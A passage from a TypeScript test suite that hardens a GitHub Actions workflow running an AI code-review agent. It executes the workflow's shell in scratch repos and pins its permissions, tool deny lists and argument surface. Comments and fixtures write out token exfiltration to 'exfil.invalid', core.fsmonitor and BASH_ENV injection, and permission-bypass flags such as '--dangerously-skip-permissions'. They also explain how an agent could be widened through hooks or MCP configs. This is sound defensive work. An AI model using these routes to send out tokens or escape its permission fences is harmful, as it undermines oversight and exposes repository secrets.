  // executed body - and would equally hand `GIT_CONFIG_KEY_0=core.fsmonitor` to it. Measured:
  // without this line the added keys run their payload here while the pin above reports the
  // mutation. Refuse the unknown key instead of executing it.
  expect(envKeys(src, 'Push fold commit'), 'the push step declares an env key this harness will not execute').toEqual(
    PUSH_STEP_ENV_KEYS
  );

  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'bot-fold-push-'));
  try {
    const remote = path.join(root, 'remote.git');
    const work = path.join(root, 'work');
    const home = path.join(root, 'home');
    const bin = path.join(root, 'bin');
    // `tmp` so the body's two `mktemp` files are removed with the scratch root rather than
    // accumulating in the host temp dir, and the shim because `TMPDIR` does not get them there
    // on macOS - see `writeMktempShim`.
    const tmp = path.join(root, 'tmp');
    for (const dir of [work, home, bin, tmp]) fs.mkdirSync(dir);
    writeMktempShim(bin);
    const git = (cwd: string, ...args: string[]) =>
      execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], {
        encoding: 'utf8',
        stdio: 'pipe',
      });
    execFileSync('git', ['init', '-q', '--bare', remote], { stdio: 'pipe' });
    git(work, 'init', '-q', '.');
    // Content DERIVED FROM THE PATH, not a constant. With every file holding the same bytes, a
    // mutation that copies one tracked file over another (`git show HEAD:README.md >
    // .github/workflows/ci.yml`, which is F1's route) writes identical bytes, so `commit -a` has
    // nothing extra to stage and the commit-contents assertion below cannot see it. Measured: with
    // a constant the F1 mutation cost one failing test, with this it costs two.
    const writeFile = (file: StagedFile) => {
      const abs = path.join(work, file.path);
      fs.mkdirSync(path.dirname(abs), { recursive: true });
      const text = [...Array(file.lines ?? 1)].map((_, i) => `${file.path}:${i}`).join('\n') + '\n';
      fs.writeFileSync(abs, file.binary ? Buffer.from([0x1f, 0x8b, 0x00, 0x41]) : text);
    };
    for (const tracked of PUSH_TRACKED) writeFile({ path: tracked });
    git(work, 'add', '-A');
    git(work, 'commit', '-q', '-m', 'base');
    git(work, 'push', '-q', remote, `HEAD:refs/heads/${PUSH_HEAD_REF}`);
    // The author pushing while the review ran, which is the only push failure this step can
    // produce without a network: it is what makes the fail-closed contract observable.
    if (fixture.diverge) {
      writeFile({ path: 'README.md', lines: 3 });
      git(work, 'commit', '-q', '-a', '-m', 'the author pushed while the review ran');
      git(work, 'push', '-q', remote, `HEAD:refs/heads/${PUSH_HEAD_REF}`);
      git(work, 'reset', '-q', '--hard', 'HEAD~1');
    }
    for (const edit of fixture.edits ?? []) writeFile(edit);
    for (const dropped of fixture.untracked ?? []) writeFile({ path: dropped });

    // The remote URL, and nothing else about the invocation. `for arg` iterates the argv
    // snapshot, so append-and-shift rotates the list exactly once.
    //
    // Any OTHER remote is refused rather than passed through. Redirecting only the github.com
    // form left the harness bounding the refspec (`remoteRefs` below) while saying nothing
    // about the DESTINATION: a body pushing to `https://x:${PUSH_TOKEN}@elsewhere.invalid/r`
    // ran unredirected, so the fixture observed an untouched scratch remote and passed while
    // the executed body had shipped the token off-box. Loud, not silent: a mutation that moves
    // the destination now fails the run it is executed in. The scp-like arm keys on `@` before
    // a `:`, which no argument in the shipped body carries - the commit trailer holds a URL but
    // no `@`, and the identity `-c user.email=...` holds an `@` but no `:`.
    //
    // The redirect arm is anchored at the HOST. `*` matches `/` in a shell glob, so the single
    // pattern `https://*github.com/*` also matched a URL whose host is elsewhere and whose PATH
    // merely contains `github.com/` (`https://x:$PUSH_TOKEN@exfil.invalid/github.com/r.git`):
    // that spelling was silently redirected to the scratch remote and the fixture then observed
    // an untouched remote and passed, while the executed body had shipped the token off-box.
    fs.writeFileSync(
      path.join(bin, 'git'),
      [
        '#!/bin/sh',
        'for arg; do',
        '  case "$arg" in',
        '    https://github.com/*|https://*@github.com/*) set -- "$@" "$FOLD_TEST_REMOTE" ;;',
        '    http://*|https://*|ssh://*|git://*|ftp://*|ftps://*|*@*:*)',
        '      echo "fold-test: refusing a remote this harness does not redirect: $arg" >&2',
        '      exit 97 ;;',
        '    *) set -- "$@" "$arg" ;;',
        '  esac',
        '  shift',
        'done',
        'exec "$FOLD_TEST_GIT" "$@"',
      ].join('\n'),
      { mode: 0o755 }
    );
    const outputs = path.join(root, 'outputs');
    fs.writeFileSync(outputs, '');
    const env: NodeJS.ProcessEnv = {
      ...process.env,
      PATH: `${bin}${path.delimiter}${process.env.PATH ?? ''}`,
      FOLD_TEST_REMOTE: remote,
      FOLD_TEST_GIT: execFileSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim(),
      HOME: home,
      TMPDIR: tmp,
      GITHUB_OUTPUT: outputs,
      // The step's own `env:` block, READ FROM THE YAML rather than copied here. A copy made
      // this harness blind to the one edit that changes what the shipped `run:` body executes
      // without changing the body: `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` beside the file-nulling
      // vars is a git config, and a key like `core.fsmonitor` is a command git runs.
      //
      // A value the runner substitutes cannot come from the file, so those keys are resolved
      // from the table below and every other key is passed through VERBATIM. An UNKNOWN
      // `${{ }}` key fails here rather than being dropped, which is what stops this harness
      // silently ignoring a future env edit - and it fails BEFORE the body is executed, so an
      // added key cannot reach a real process out of this fixture.
      ...Object.fromEntries(
        envPairs(src, 'Push fold commit').map(([key, value]) => {
          if (!value.includes('${{')) return [key, value.replace(/^'(.*)'$/, '$1')];
          const substituted: Record<string, string> = {
            PUSH_TOKEN: 'x-fold-test-token',
            HEAD_REF: PUSH_HEAD_REF,
            REPO: 'owner/repo',
            SERVER_URL: 'https://github.com',
            RUN_ID: '1',
          };
          expect(substituted, `Push fold commit: unmodelled env key ${key}`).toHaveProperty(key);
          return [key, substituted[key] ?? ''];
        })
      ),
    };
    // Or git reads the DEVELOPER's attributes and ignore files instead of this scratch $HOME.
    delete env.XDG_CONFIG_HOME;
    const run = spawnSync('bash', ['-c', body], { cwd: work, encoding: 'utf8', env, timeout: 120_000 });
    const written = fs.readFileSync(outputs, 'utf8');
    const remoteLog = git(remote, 'log', '--format=%s', PUSH_HEAD_REF).split('\n').filter(Boolean);
    const baseCommits = fixture.diverge ? 2 : 1;
    const remoteChanged =
      remoteLog.length > baseCommits
        ? git(remote, 'show', '--name-only', '--format=', PUSH_HEAD_REF).split('\n').filter(Boolean)
        : [];
    return {
      status: run.status ?? -1,
      out: `${run.stdout}${run.stderr}`,
      pushed: [...written.matchAll(/^pushed=(\S*)$/gm)].map(m => m[1]),
      reason: [...written.matchAll(/^reason=(.*)$/gm)].pop()?.[1],
      remoteLog,
      remoteChanged,
      remoteRefs: git(remote, 'for-each-ref', '--format=%(refname)').split('\n').filter(Boolean),
    };
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
}

/** One API entry the `posted` measurement will see. `at: null` models a PENDING review. */
type PostedEntry = { login?: string; at?: string | null };
type PostedFixture = {
  since?: string;
  reviews?: PostedEntry[];
  inline?: PostedEntry[];
  issue?: PostedEntry[];
  apiStatus?: number;
};
const BOT_LOGIN = 'claude[bot]';
const DEFAULT_SINCE = '2026-01-01T00:00:00Z';

/**
 * Runs the `posted` measurement, lifted verbatim out of the committed YAML, against fixture API
 * responses, and returns what it wrote to `$GITHUB_OUTPUT`.
 *
 * This is the antecedent of the whole write path - the mint, the push, the path guard and the
 * size bound are all downstream of `posted == 'true'` - and it was previously asserted only
 * where it is READ. Four one-token edits inside the step make it unconditionally true while
 * every consumer gate stays correctly spelled, so it has to be executed rather than matched.
 * `gh` is a stub on PATH, so the real `count_since`, the real string time compare and the real
 * fail-closed arms all run.
 */
function runPostedCheck(src: string, fixture: PostedFixture): string {
  // Verbatim, comments included, for the reason `runStagedGuards` states.
  const bodies = runBodiesRaw(step(src, 'Verify a review was actually posted'));
  // One `run:`, for the reason the staged-guard lift states: a second body in the same step
  // would leave whichever one this executes unrepresentative of what the runner runs.
  expect(bodies, 'expected exactly one run: body in the posted-review step').toHaveLength(1);
  const body = bodies[0];

  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bot-fold-posted-'));
  try {
    const bin = path.join(dir, 'bin');
    fs.mkdirSync(bin);
    writeMktempShim(bin);
    const payload = (entries: PostedEntry[] | undefined, at: 'submitted_at' | 'created_at') =>
      JSON.stringify(
        (entries ?? []).map((entry, i) => ({
          id: `id${i}`,
          user: { login: entry.login ?? BOT_LOGIN },
          [at]: entry.at === null ? null : (entry.at ?? fixture.since ?? DEFAULT_SINCE),
        }))
      );
    fs.writeFileSync(path.join(dir, 'reviews.json'), payload(fixture.reviews, 'submitted_at'));
    fs.writeFileSync(path.join(dir, 'inline.json'), payload(fixture.inline, 'created_at'));
    fs.writeFileSync(path.join(dir, 'issue.json'), payload(fixture.issue, 'created_at'));
    fs.writeFileSync(path.join(dir, 'empty.json'), '[]');
    // argv is `api --paginate <path> --jq <selector>`, so $3 is the endpoint and $5 the
    // selector. The selector is handed to the REAL jq over a real response shape: stubbing it
    // out - counting entries and discarding `--jq` - meant the login filter, the `submitted_at
    // != null` arm and the watermark compare, which are the entire substance of this
    // measurement, never ran, and a selector that matched everything read as correct.
    fs.writeFileSync(
      path.join(bin, 'gh'),
      [
        '#!/bin/sh',
        'if [ "$FAKE_GH_STATUS" -ne 0 ]; then echo "api error" >&2; exit "$FAKE_GH_STATUS"; fi',
        'case "$3" in',
        '  */pulls/*/reviews) f=reviews.json ;;',
        '  */pulls/*/comments) f=inline.json ;;',
        '  */issues/*/comments) f=issue.json ;;',
        '  *) f=empty.json ;;',
        'esac',
        'exec jq -r "$5" < "$FIXTURE_DIR/$f"',
      ].join('\n'),
      { mode: 0o755 }
    );
    const outputs = path.join(dir, 'outputs');
    fs.writeFileSync(outputs, '');
    // See `runStagedGuards`: the body's `count_since` makes a `mktemp` per call, and TMPDIR keeps
    // those inside the scratch dir that is removed at the end of this function.
    const tmp = path.join(dir, 'tmp');
    fs.mkdirSync(tmp);
    const run = spawnSync('bash', ['-c', body ?? ''], {
      cwd: dir,
      encoding: 'utf8',
      timeout: 120_000,
      env: {
        ...process.env,
        PATH: `${bin}${path.delimiter}${process.env.PATH ?? ''}`,
        GITHUB_OUTPUT: outputs,
        TMPDIR: tmp,
        GH_TOKEN: 'stub',
        BOT_REVIEW_LOGIN: BOT_LOGIN,
        REPO: 'owner/repo',
        PR: '1',
        SINCE: fixture.since ?? DEFAULT_SINCE,
        FIXTURE_DIR: dir,
        FAKE_GH_STATUS: String(fixture.apiStatus ?? 0),
      },
    });
    const written = fs.readFileSync(outputs, 'utf8');
    // LAST match, the way Actions reads a step output file: an earlier `posted=` is overwritten
    // by a later one, so reading the first would report a value the consumers never see.
    const posted = [...written.matchAll(/^posted=(\S*)$/gm)].pop()?.[1];
    expect(posted, `no posted= emitted (${run.stdout}${run.stderr})`).toBeTruthy();
    return posted ?? '';
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

// Several of these EXECUTE the lifted shell against a scratch git repo, so their cost is
// process spawns rather than CPU. Under a full-package run that is ~10x the isolated wall
// clock, which put the heaviest one past the 30s default; the headroom is for contention,
// not for a slow assertion.
describe('bot-fold write path', { timeout: 180_000 }, () => {
  const src = fs.readFileSync(WORKFLOW, 'utf8');

  it('derives FOLD_MODE from the bot-fold label and nothing else', () => {
    // The antecedent every other assertion here is written in terms of. Hardcoding this to
    // 'true' - the obvious way to try to exercise a path that cannot otherwise be rehearsed -
    // gives every `bot-review` label the write tools, a write token and a push to the PR head.
    expect(src).toMatch(/^ {6}FOLD_MODE: \$\{\{ github\.event\.label\.name == 'bot-fold' \}\}$/m);
    expect(src.match(/^ *FOLD_MODE:/gm)).toHaveLength(1);
  });

  it('runs on a trigger and under a job gate that cannot be widened', () => {
    // Everything else in this file asserts something at or below `steps:`, which left the four
    // lines the whole job hangs off unmeasured: the trigger, the fork gate, the rest of the job
    // `if:` and the GITHUB_TOKEN scope were each wideable one token at a time with the suite
    // green. They are the antecedent of every bound below, so they are pinned by VALUE.
    const top = withoutComments(src);

    // Both blocks are compared by VALUE, not matched by prefix. A prefix match sees a
    // SUBSTITUTION (`pull_request` -> `pull_request_target`, `read` -> `write`) but is blind to
    // an ADDITION that reaches the same end state without disturbing the matched text: a sixth
    // `permissions:` key, or a second trigger appended below `types: [labeled]`, sits outside
    // the match and leaves it green. Lifting the whole block up to the next column-0 key is
    // what makes the two shapes indistinguishable to the assertion.
    const topLevelBlock = (key: string) => {
      const blocks = [...top.matchAll(new RegExp(`^${key}:\\n(?: +.*\\n|\\n)*`, 'gm'))];
      // Exactly one, not the first of several, for the reason `jobIfConjuncts` states: a decoy
      // copy above the real key leaves this comparing text the workflow never uses.
      expect(blocks, `expected exactly one top-level ${key}:`).toHaveLength(1);
      return blocks[0][0].replace(/\s+#.*$/gm, '').trimEnd();
    };

    // And the file has to be YAML the runner can LOAD, which one spelling in this job does not
    // survive. A plain scalar may not begin with a YAML indicator, so `if: !cancelled() && ...`
    // written on ONE line is not an expression at all - it is the tag `!cancelled()`, and the
    // workflow fails to load with "unknown tag". Every other negation gate here is a block
    // scalar, which is what kept the class out until a one-line edit was made into one. There is
    // no YAML parser resolvable from this package (the reason the docblock states for reading
    // these structures as text), so this is the narrow rule rather than the general one: a
    // mapping VALUE, on the same line as its key, may not open with an indicator.
    expect(top.match(/^ +[A-Za-z_-]+: +[!&*%]/gm) ?? [], 'a plain scalar opens with a YAML indicator').toEqual([]);
    // POSITIVE CONTROL for the rule, in the exact shape that was caught by hand: the review
    // step's gate written on one line, opening with a negation. The shipped file reads clean
    // above, so the pair is what makes this a bound rather than a formality.
    const markerTag = src.replace(
      "        if: steps.size_check.outputs.skip == 'false' && steps.substantive.outputs.skip == 'false' && steps.skill_fetch.outcome == 'success'\n",
      "        if: !cancelled() && steps.skill_fetch.outcome == 'success'\n"
    );
    expect(markerTag, 'the single-line if: anchor moved').not.toBe(src);
    expect(withoutComments(markerTag).match(/^ +[A-Za-z_-]+: +[!&*%]/gm) ?? []).toHaveLength(1);

    // `pull_request_target` is the single swap that voids every other bound here: it runs with
    // the base repo's secrets while this job checks out and runs an agent over the untrusted PR
    // head. The workflow's own comment forbids it in prose; this is the part that enforces it.
    expect(topLevelBlock('on')).toBe('on:\n  pull_request:\n    types: [labeled]');
    expect(top).not.toMatch(/pull_request_target/);

    // `contents: read` on GITHUB_TOKEN. Not the fold push's authority - that is the separately
    // minted App token - but widening this hands write to every OTHER step in the job,
    // including the ones that run after the agent.
    expect(topLevelBlock('permissions')).toBe(
      'permissions:\n  contents: read\n  pull-requests: write\n  issues: write\n  actions: read\n  id-token: write'
    );

    // A JOB-level `permissions:` replaces the workflow-level block wholesale rather than
    // merging with it, so it reaches `contents: write` for every step in the job without
    // touching the lines pinned just above. Exactly one `permissions:` key, at column 0.
    // The WHOLE LINE, at any indent and through EITHER key spelling. `^ *permissions:$`
    // required end-of-line right after the colon, so it saw the block form only, and
    // `^ *permissions\b` still required the key to start with a bare `p` - a job-level
    // `"permissions": write-all` matched neither and quoted is the same key to YAML. A
    // `permissions: {contents: write}` flow mapping and a trailing space were the other two
    // shapes a prefix match waved through.
    expect(top.match(/^ *["']?permissions["']? *:.*$/gm)).toEqual(['permissions:']);

    expect(jobIfConjuncts(src)).toEqual([
      // Fork PRs get no secrets and a read-only token, so this would fail on every one of them;
      // it is also what keeps `pull_request` safe to check out and run an agent over.
      'github.event.pull_request.head.repo.full_name == github.repository',
      'github.event.pull_request.draft == false',
      "github.event.pull_request.base.ref != 'prod'",
      "github.event.pull_request.head.ref != 'prod'",
      "!startsWith(github.event.pull_request.head.ref, 'changeset-release/')",
      "(github.event.label.name == 'bot-review' || github.event.label.name == 'bot-fold')",
    ]);

    // The key SETS, at both levels, for the reason the two blocks above are compared by value:
    // a bound that is a property of which keys are present cannot be stated by pinning the ones
    // someone already thought of. `defaults: { run: { shell: ... } }` at column 0 changes the
    // program every `run:` body below is executed BY, and a job-level `container:` moves every
    // step into an image the three absolute `/home/runner/...` write fences are not a premise
    // about - each reaching past every other assertion in this file without disturbing one.
    //
    // Read through the SHARED mapping reader, not a bare-token `matchAll`. `/^ {4}
    // ([a-z][a-z-]*):/gm` reads a plain key and nothing else, so a quoted one reached neither
    // this sweep nor the `permissions` line above and the job's key set read as unchanged.
    const jobs = top.slice(top.indexOf('\njobs:'));
    expect(mappingKeysAt(top, 0, 'top-level keys')).toEqual(['name', 'on', 'permissions', 'concurrency', 'jobs']);
    // One job, so the decoy `jobIfConjuncts` refuses cannot arrive as a second job either.
    expect(mappingKeysAt(jobs, 2, 'job name')).toEqual(['review']);
    expect(mappingKeysAt(jobs, 4, 'job keys')).toEqual(['if', 'runs-on', 'timeout-minutes', 'env', 'steps']);
    // The job env, by value. `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` strips the Anthropic key and
    // the runner's own Actions credentials out of every subprocess the agent's tools spawn and
    // pins the permission mode to `default`; it is the second line of the no-shell posture, and
    // deleting it turned nothing in this file red.
    //
    // Read through the shared mapping reader, not a `matchAll` over the whole job block: this is
    // a key-SET bound, so a reader that under-counts is not a weaker assertion but a false one,
    // and a `"BASH_ENV":` key here would set a variable for every step in the job while a
    // bare-token `matchAll` reported the block unchanged.
    expect(mappingEntries(liftBlock(jobs, 'env', 4, 'job env'), 6, 'job env')).toEqual([
      ['CLAUDE_CODE_SUBPROCESS_ENV_SCRUB', "'1'"],
      ['FOLD_MODE', "${{ github.event.label.name == 'bot-fold' }}"],
    ]);
    // POSITIVE CONTROL, on the spelling the old reader could not see. A quoted key is the same
    // key to YAML and the same variable to the runner, and it reaches this pin as a change
    // rather than as nothing.
    const quotedJobKey = src.replace(/^( {6})FOLD_MODE:/m, `$1"BASH_ENV": /tmp/x.sh\n$1FOLD_MODE:`);
    expect(quotedJobKey, 'the job env injection anchor moved').not.toBe(src);
    expect(mappingEntries(liftBlock(quotedJobKey, 'env', 4, 'job env'), 6, 'job env').map(([key]) => key)).toContain(
      'BASH_ENV'
    );
    // And the appended-key axis at this level. Note the block is read from the comment-stripped
    // `jobs`, so a comment here is inert and the truncation P1-2 filed does NOT reach this reader
    // - it reaches the two STEP-level ones, which read raw text. Stated rather than left implied,
    // because with the lift in place a reader that was already immune looks identical to one the
    // fix repaired.
    const appendedJobKey = src.replace(/^( {6}FOLD_MODE: .*\n)/m, '$1    # trailing note\n      BASH_ENV: /tmp/x.sh\n');
    expect(appendedJobKey, 'the job env tail anchor moved').not.toBe(src);
    expect(mappingEntries(liftBlock(appendedJobKey, 'env', 4, 'job env'), 6, 'job env').map(([key]) => key)).toEqual([
      'CLAUDE_CODE_SUBPROCESS_ENV_SCRUB',
      'FOLD_MODE',
      'BASH_ENV',
    ]);
    // And a line that is not a key at all is refused rather than dropped.
    expect(() => mappingEntries('      :: not a key\n', 6, 'probe')).toThrow(/not a key/);
  });

  it('denies Bash in every mode, and grants it in none', () => {
    const denied = toolFlagValues(src, 'disallowedTools');
    expect(denied).toHaveLength(1);
    const deny = toolListModes(denied[0]);
    // By VALUE, not by substring. `toMatch` cannot tell a live condition from
    // `env.FOLD_MODE == 'true' || github.event.label.name != 'zzz'`, which still contains
    // every character it looks for and is unconditionally true - so every ordinary
    // `bot-review` run would select the fold arm and hand file-write tools to an agent
    // reading untrusted public comment text. This is the same reasoning `ifConjuncts`
    // states, applied to the antecedent the two tool lists actually branch on.
    expect(deny.condition.trim()).toBe("env.FOLD_MODE == 'true'");
    expect(deny.fold).toContain('Bash');
    expect(deny.review).toContain('Bash');

    const allowed = toolFlagValues(src, 'allowedTools');
    expect(allowed).toHaveLength(1);
    const allow = toolListModes(allowed[0]);
    expect(allow.condition.trim()).toBe("env.FOLD_MODE == 'true'");
    expect(allow.fold).not.toContain('Bash');
    expect(allow.review).not.toContain('Bash');
  });

  it('grants only read-shaped GitHub tools plus the review-submission ones', () => {
    // Pinned BY VALUE, not by spot-checks. The list already holds five write-shaped
    // `mcp__github__*` names (the pending-review lifecycle), so one more - say
    // `create_or_update_file` - reads as routine and would let the agent write to the
    // branch through claude-code-action's OWN App token, routing around `git add -u`,
    // the path guard, the size bound, the non-force flag and the refspec at once.
    // Nothing else in this repo can catch that, so the whole set is spelled out here
    // and adding to it has to be a deliberate edit in two places.
    const allow = toolListModes(toolFlagValues(src, 'allowedTools')[0]);
    expect(allow.review.sort()).toEqual(
      [
        'Agent',
        'Glob',
        'Grep',
        'Read',
        'Task',
        'mcp__github__add_comment_to_pending_review',
        'mcp__github__create_and_submit_pull_request_review',
        'mcp__github__create_pending_pull_request_review',
        'mcp__github__delete_pending_pull_request_review',
        'mcp__github__get_commit',
        'mcp__github__get_file_contents',
        'mcp__github__get_issue',
        'mcp__github__get_issue_comments',
        'mcp__github__get_pull_request',
        'mcp__github__get_pull_request_diff',
        'mcp__github__get_pull_request_files',
        'mcp__github__get_pull_request_review_comments',
        'mcp__github__get_pull_request_reviews',
        'mcp__github__get_pull_request_status',
        'mcp__github__list_commits',
        'mcp__github__submit_pending_pull_request_review',
      ].sort()
    );
    // The fold mode adds exactly the two local file-write tools and no API writer.
    // `MultiEdit` is deliberately NOT here: this CLI version does not know that name
    // and warns that the rule matches no known tool, so granting it granted nothing.
    expect(allow.fold.filter(tool => !allow.review.includes(tool)).sort()).toEqual(['Edit', 'Write']);
  });

  it('grants the file-write tools on the fold mode only', () => {
    // Deny beats allow, so the deny list is the side that actually decides this.
    const deny = toolListModes(toolFlagValues(src, 'disallowedTools')[0]);
    for (const tool of ['Write', 'Edit']) {
      expect(deny.review).toContain(tool);
      expect(deny.fold).not.toContain(tool);
    }
    // The two modes differ by those two names and nothing else.
    expect(deny.review.filter(tool => !deny.fold.includes(tool)).sort()).toEqual(['Edit', 'Write']);
  });

  it('fences the fold write tools by Edit() spec, the only spelling the CLI honours', () => {
    // Spelling first, because getting it wrong is silent. A path rule naming `Write` or
    // `MultiEdit` is IGNORED by the file-permission checks - accepted, never consulted, so
    // it reads exactly like a live control - while an `Edit(path)` rule covers every
    // file-editing tool. Do not lean on the CLI's warning about an ignored spec either: it
    // is emitted per output mode, and this job runs the action's JSON stream, where it can
    // land in the debug log instead of anywhere a reader here would see it. A previous
    // revision carried all three spellings for both roots, which read as six controls and
    // was two, and is how the $RUNNER_TEMP hole below got missed.
    const deny = toolListModes(toolFlagValues(src, 'disallowedTools')[0]);
    const pathSpecs = deny.fold.filter(spec => spec.includes('('));
    expect(pathSpecs.filter(spec => /^(Write|MultiEdit)\(/.test(spec))).toEqual([]);

    // The fold write fence, by value. Repo-relative roots plus the runner temp root,
    // because a bare write-tool grant reaches absolute paths anywhere on the filesystem
    // and not only the working directory. $RUNNER_TEMP holds the runner's own
    // `_runner_file_commands` files ($GITHUB_PATH / $GITHUB_ENV, i.e. command execution
    // in every later step), the private bot-review skill, and the action's transcript.
    // `.claude/**` and `.mcp.json` are both "declares something the CLI then executes":
    // `hooks` in the first, an MCP server in the second. The CLI's own sensitive-file list
    // refuses both today, which is exactly why they are stated here - that list is one
    // rename away from not covering them, and a hook or a server is command execution in a
    // job whose entire premise is that the agent has no shell.
    expect(pathSpecs.filter(spec => spec.startsWith('Edit(')).sort()).toEqual(
      [
        'Edit(.claude/**)',
        'Edit(.git/**)',
        'Edit(.github/**)',
        'Edit(.mcp.json)',
        // git honours an UNTRACKED `.gitattributes`, which `git add -u` never stages and the
        // path guard therefore never sees - and it decides what `--numstat` calls binary, so
        // one planted file turns the binary arm and the 800-line bound off together.
        'Edit(.gitattributes)',
        'Edit(**/.gitattributes)',
        // Both spellings, and for a reason the twin above does not carry on its own: the path
        // guard's root-dotfile arm reaches a TRACKED root `.gitignore` only, while
        // `--exclude-standard` honours an UNTRACKED one at any depth. A nested or untracked
        // one holding `*` silences the dropped-untracked-file report without being staged.
        'Edit(.gitignore)',
        'Edit(**/.gitignore)',
        ...ALWAYS_ON_EDIT_FENCES,
      ].sort()
    );
    // Three of the four fences above are absolute literals for the hosted layout, so they are
    // only as good as the runner staying that image. Pinned next to them so the two have to
    // move together: swapping the default label without revisiting the fences turns this red.
    expect(src).toContain(RUNS_ON);
    // Every OTHER parenthesised spec, by value, in BOTH arms. `toContain` on the three
    // `Read()` fences left a bucket nothing read: a spec containing `(` that does not start
    // `Edit(` was asserted by neither the set above nor this, so appending one to either arm
    // was invisible - and appending `Read(/dev/null)" --settings ./ci-settings.json "` put
    // `--settings` on the real CLI's argv while reading as one more hardening deny.
    const reads = ['Read(.git/**)', 'Read(//proc/**)', 'Read(//sys/**)'];
    expect(pathSpecs.filter(spec => !spec.startsWith('Edit(')).sort()).toEqual([...reads].sort());
    // The step's own comment says both branches are spelled out in full by design, so every
    // edit here is a both-arms edit, and a fold-arm-only assertion waves the review arm through.
    expect(deny.review.filter(spec => spec.includes('(')).sort()).toEqual([...reads, ...ALWAYS_ON_EDIT_FENCES].sort());
    // Single-shot process, so a wakeup can only ever be a lost run. Denied in both arms.
    expect(deny.fold).toContain('ScheduleWakeup');
    expect(deny.review).toContain('ScheduleWakeup');

    // The rest of the deny list, as a set, for the same reason the path specs are: a name
    // dropped from BOTH arms leaves every surviving assertion here passing. Deny is the side
    // that decides, so a subtraction here is a widening and has to be a deliberate edit.
    // `MultiEdit` and `NotebookEdit` are names this CLI does not know, so they deny nothing
    // today; they are kept because a rename is what would make them live and the cost is nil.
    const plain = ['Bash', 'MultiEdit', 'NotebookEdit', 'ScheduleWakeup', 'WebFetch', 'WebSearch'];
    expect(deny.fold.filter(spec => !spec.includes('(')).sort()).toEqual([...plain].sort());
    expect(deny.review.filter(spec => !spec.includes('(')).sort()).toEqual([...plain, 'Edit', 'Write'].sort());
  });

  it('passes the action an allowlisted argument surface and nothing else', () => {
    // The deny list above is only as good as the argument surface around it, and that
    // surface was previously guarded by a three-name denylist
    // (`--permission-mode|--dangerously-skip-permissions|--settings`). Enumerating the ways
    // to widen a permission model is the wrong side to enumerate: `settings:` on the `with:`
    // block writes `$HOME/.claude/settings.json`, which can declare `hooks`; `plugins:` and
    // `plugin_marketplaces:` load hooks too; and an inline `--mcp-config` starts a server
    // process, which happens before any permission check has a say. Each of those is
    // command execution with `Bash` and every write tool denied, and each is one line.
    //
    // So both surfaces are pinned as SETS. Adding an argument to this step has to be a
    // deliberate edit here, which is where the question "does this reach execution?" gets
    // asked.
    expect(step(src, 'Run /bot-review')).toMatch(/^ {8}uses: anthropics\/claude-code-action@v1$/m);
    expect(withKeys(src, 'Run /bot-review').sort()).toEqual(['anthropic_api_key', 'claude_args', 'prompt']);
    // POSITIVE CONTROL, on the spelling a bare-token reader cannot see. `"settings"` is the same
    // input to the action as `settings` is, and `settings` is the one that writes
    // `$HOME/.claude/settings.json` with its `hooks` block - so a quoted spelling that the pin
    // read as unchanged was a hole in the assertion that exists to close exactly that route.
    const quotedWithKey = src.replace(/^( {10})claude_args:/m, `$1"settings": ./probe-settings.json\n$1claude_args:`);
    expect(quotedWithKey, 'the with: injection anchor moved').not.toBe(src);
    expect(withKeys(quotedWithKey, 'Run /bot-review')).toContain('settings');
    // POSITIVE CONTROL for the block lift, on the axis a "deeper than me or empty" arm is blind
    // to: a comment indented ABOVE the key column matches neither arm, so the capture ended there
    // and everything below it fell outside the pin while the reader was handed a well-formed
    // prefix and threw nothing. Placed AFTER the last shipped key on purpose - a comment higher
    // up makes a shipped key go missing, which reds loudly and hides the escape this is for.
    const afterLastWithKey = src.replace(
      /^( {14}this run just ends, unreviewed, if you do\.\n)/m,
      '$1        # trailing note\n          settings: ./probe-settings.json\n'
    );
    expect(afterLastWithKey, 'the with: tail anchor moved').not.toBe(src);
    expect(withKeys(afterLastWithKey, 'Run /bot-review')).toContain('settings');
    // The same control for `claude_args`, whose key is two levels deeper and whose consumer
    // shell-parses the block: the comment sits at the STEP key column, below the `claude_args:`
    // key and above the argument column, which is the exact shape that truncated the capture.
    const afterTurnCap = src.replace(
      /^( {12}--max-turns 80\n)/m,
      '$1        # trailing note\n            --settings ./probe-settings.json\n'
    );
    expect(afterTurnCap, 'the claude_args tail anchor moved').not.toBe(src);
    expect(() => assertArgSurface(claudeArgTokens(afterTurnCap))).toThrow();
    assertArgSurface(claudeArgTokens(src));
    // And again with each `${{ }}` standing for several words, one of them a flag. GitHub
    // expands these before the action shell-parses the result, so an UNQUOTED expansion is
    // where the tokenisation stops being the file's to decide - a ternary arm is an ordinary
    // place to edit and its contents are not pinned anywhere. Quoting is what makes the
    // one-word reading above true, so it is asserted here rather than assumed.
    assertArgSurface(claudeArgTokens(src, MULTI_WORD_EXPANSION));
  });

  it('sees an argument appended to an existing line, rather than only a new line', () => {
    // POSITIVE CONTROL for the assertion above. It used to match `/^\s*(--[A-Za-z0-9-]+)/gm`,
    // which sees the FIRST flag of each line and nothing after it - while the action
    // shell-parses the concatenated block, to which a newline is just whitespace. So every
    // shape below was live at the CLI and green in this suite. `--max-turns 80` in particular
    // sits under a comment about the turn budget, so appending there is an ordinary edit.
    const appended = [
      '--settings ./ci-settings.json',
      '--mcp-config /tmp/evil.json',
      '--permission-mode bypassPermissions',
      '--dangerously-skip-permissions',
      // Not a flag. `parseClaudeArgsToExtraArgs` absorbs a bareword into the value run of an
      // ACCUMULATING flag, and `--max-turns` is not one, so at THIS position the token is
      // discarded rather than granting anything - move the same token one line up, after
      // `--allowedTools "..."`, and it joins the allow list. Refused either way, because
      // which flag a bareword lands on is not a property the surface should have to reason
      // about.
      'Bash',
    ];
    for (const suffix of appended) {
      const injected = src.replace(/^ {12}--max-turns 80$/m, `            --max-turns 80 ${suffix}`);
      expect(injected, 'the injection anchor moved').not.toBe(src);
      expect(() => assertArgSurface(claudeArgTokens(injected)), `not caught: ${suffix}`).toThrow();
    }

    // And the same control for the expansion axis: drop the quotes off any one `${{ }}` and a
    // multi-word arm reaches the CLI as separate arguments. Fed through the real parser, the
    // unquoted form yields `extraArgs = {settings: './ci-settings.json'}` - command execution
